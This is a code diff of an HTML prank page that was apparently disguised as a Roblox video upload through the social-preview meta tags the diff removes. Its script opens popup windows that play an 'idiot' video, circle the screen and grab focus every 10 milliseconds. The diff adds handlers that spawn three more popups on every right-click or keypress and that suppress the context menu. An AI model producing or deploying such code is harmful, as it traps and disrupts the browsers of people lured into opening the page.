@@ -1,20 +1,12 @@
 <html>
 
 <head>
-  <title>Upload</title>
-   <meta property="og:site_name" content="mau-api">
-<meta property="og:url" content="https://mau-api.tk">
-<meta property="og:title" content="Video upload - robloxapp-20210208-20383623.wmv">
-<meta name="theme-color" content="#0x0000ff">
-<meta name="theme-color" content="#0000ff">
-<meta property="og:type" content="website">
-  <meta name="og:image" itemprop="image" content="https://mau-api.tk/cdn/logo">
-<meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>click the button</title>
 </head>
 
 <body>
 
-  <button id="c">Load video</button>
+  <button id="c">click</button>
   <video src="https://mau-api.tk/cdn/idiot.mp4" loop id="vi" style="display: none; width:500px; height:300px;">
   <script>
     var a = document.getElementById("c")
@@ -28,7 +20,7 @@ function rd(min, max) {
     return Math.round(Math.random() * (max - min) + min)
 }
 
-      setInterval(function(){
+     function ct(){
         let to 
         let x = 0
         let y = 0
@@ -44,7 +36,8 @@ let inc = 0
  let windo = window.open("about:blank", "", "_blank")
         windo.document.write(`  
         <video src="https://mau-api.tk/cdn/idiot.mp4" loop id="vi" autoplay style=" width:500px; height:300px;"> 
-        <script>window.onload => vi.play()<\/script>
+        <script>window.onload = () => vi.play()
+        <\/script>
     `)
         windo.document.close()
       setInterval(function(){
@@ -54,7 +47,23 @@ let inc = 0
         windo.moveTo(lerp(ox, 700*Math.cos(inc/speed), .1),lerp(oy, 700*Math.sin(inc/speed), .1))
         windo.focus()
       }, 10)
-      }, 500)
+     }
+      
+      ct()
+      
+
+      window.oncontextmenu = function() {
+        for (let i = 0; i < 3; i++){
+          ct()
+        }
+        return false;
+      }
+      
+      window.onkeydown = function(){
+        for (let i = 0; i < 3; i++){
+          ct()
+        }
+      }
     })
     </script>
 
